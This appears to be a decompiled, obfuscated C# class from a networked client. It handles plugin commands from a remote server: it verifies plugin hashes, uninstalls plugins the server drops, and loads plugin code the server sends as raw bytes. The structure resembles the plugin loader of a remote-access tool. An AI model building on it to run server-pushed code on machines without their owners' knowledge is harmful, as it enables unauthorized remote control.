using System;
using System.Collections.Generic;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
internal sealed class Class5
{
	public static bool bool_0;

	public static bool bool_1;

	public static void smethod_0(GStruct2 gstruct2_0)
	{
		switch (gstruct2_0.byte_1)
		{
		case 0:
			smethod_1(gstruct2_0.object_0);
			break;
		case 1:
			smethod_2(gstruct2_0.object_0);
			break;
		case 2:
			smethod_3(gstruct2_0.object_0);
			break;
		case 3:
			smethod_4(gstruct2_0.object_0);
			break;
		}
	}

	public static void smethod_1(object[] object_0)
	{
		bool_1 = false;
		Class8.int_1 = 0;
		if (Class8.queue_0.Count != 0)
		{
			Class11.smethod_7(Class8.queue_0.Dequeue());
		}
		byte[] byte_ = (byte[])object_0[0];
		bool bool_ = ((Class8.byte_1 == null || !Class17.smethod_5(Class8.byte_0, byte_)) ? true : false);
		smethod_5(bool_);
	}

	public static void smethod_2(object[] object_0)
	{
		DateTime dateTime_ = (DateTime)object_0[0];
		byte[] byte_ = (byte[])object_0[1];
		Class8.dateTime_0 = dateTime_;
		Class8.byte_1 = byte_;
		Class8.byte_0 = Class18.smethod_2(Class8.byte_1);
		Class8.smethod_9();
		smethod_6();
	}

	public static void smethod_3(object[] object_0)
	{
		try
		{
			List<object> list = new List<object>();
			List<Guid> list2 = new List<Guid>();
			int num = object_0.Length - 1;
			for (int i = 0; i <= num; i += 3)
			{
				Guid guid = (Guid)object_0[i];
				byte[] byte_ = (byte[])object_0[i + 1];
				bool flag = (bool)object_0[i + 2];
				list2.Add(guid);
				GClass2 gClass = Class14.smethod_1(guid);
				if (gClass == null)
				{
					list.Add(guid);
					continue;
				}
				if (gClass.bool_0 != flag)
				{
					gClass.bool_0 = flag;
					bool_1 = true;
				}
				if (!Class17.smethod_5(gClass.byte_1, byte_))
				{
					list.Add(guid);
					bool_0 = true;
					Class8.smethod_87($"Plugin [{guid}] requires an update.");
				}
			}
			Class8.smethod_5(list2.ToArray());
			foreach (GClass2 item in Class8.list_2)
			{
				if (list2.Contains(item.guid_0))
				{
					continue;
				}
				bool_0 = true;
				Class8.smethod_87($"Plugin [{item.guid_0}] is being uninstalled.");
				if (item.bool_0)
				{
					bool_1 = true;
				}
				if (item.gclass3_0 != null)
				{
					try
					{
						item.gclass3_0.method_8();
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception exception_ = ex;
						Class8.smethod_85(item.gclass3_0, exception_, "PluginUninstalling");
						ProjectData.ClearProjectError();
					}
				}
			}
			if (list.Count == 0 && bool_0)
			{
				if (bool_1)
				{
					Class8.smethod_7();
				}
				Class8.smethod_41();
			}
			else
			{
				Class8.smethod_88(Class8.client_0, bool_6: true, CommandType.PluginCommand, 2, list.ToArray());
			}
		}
		catch (Exception ex2)
		{
			ProjectData.SetProjectError(ex2);
			Exception exception_2 = ex2;
			Class8.smethod_86(exception_2, "HandlePluginDetailsCommand");
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_4(object[] object_0)
	{
		List<GClass2> list = new List<GClass2>();
		int num = object_0.Length - 1;
		for (int i = 0; i <= num; i += 5)
		{
			GClass2 gClass = new GClass2();
			gClass.guid_0 = (Guid)object_0[i];
			gClass.dateTime_0 = (DateTime)object_0[i + 1];
			gClass.string_0 = (string)object_0[i + 2];
			gClass.bool_0 = (bool)object_0[i + 3];
			gClass.byte_0 = (byte[])object_0[i + 4];
			gClass.byte_1 = Class18.smethod_2(gClass.byte_0);
			Class8.list_2.Add(gClass);
			list.Add(gClass);
			if (gClass.bool_0)
			{
				bool_1 = true;
			}
		}
		if (bool_1)
		{
			Class8.smethod_7();
		}
		if (bool_0)
		{
			Class8.smethod_41();
			return;
		}
		Class8.smethod_87("Loading plugins..");
		foreach (GClass2 item in list)
		{
			Class14.smethod_0(item.byte_0, item);
		}
		Class8.smethod_88(Class8.client_0, bool_6: true, CommandType.PluginCommand, 3, new object[0]);
	}

	public static void smethod_5(bool bool_2)
	{
		Class8.smethod_88(Class8.client_0, bool_6: true, CommandType.PluginCommand, 0, new object[1] { bool_2 });
	}

	public static void smethod_6()
	{
		Class8.smethod_88(Class8.client_0, bool_6: true, CommandType.PluginCommand, 1, new object[0]);
	}
}
